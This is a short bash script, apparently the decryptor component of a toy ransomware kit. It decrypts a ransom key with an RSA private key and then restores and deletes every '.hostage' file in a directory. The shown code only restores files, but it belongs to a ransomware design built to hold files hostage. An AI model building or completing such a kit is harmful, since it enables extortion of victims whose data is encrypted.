#!/usr/bin/bash

decrypSymetricKey() {
	openssl rsautl -decrypt -inkey $1 -in /tmp/ransomkeyfile.crypted -out /tmp/ransomkeyfile.key
}

decrypt() {
	deliver=$(echo $1 | sed -e 's/.hostage//')
	openssl aes-256-cbc -d -in $1 -out $deliver -kfile /tmp/ransomkeyfile.key 2>/dev/null
	rm $1
}

cd $1

HOSTAGE_LIST=`find ./ -type f -name "*.hostage" 2>/dev/null`
echo $HOSTAGE_LIST

decrypSymetricKey "/tmp/ransom.key"

for hostage in $HOSTAGE_LIST
do
	decrypt $hostage
done
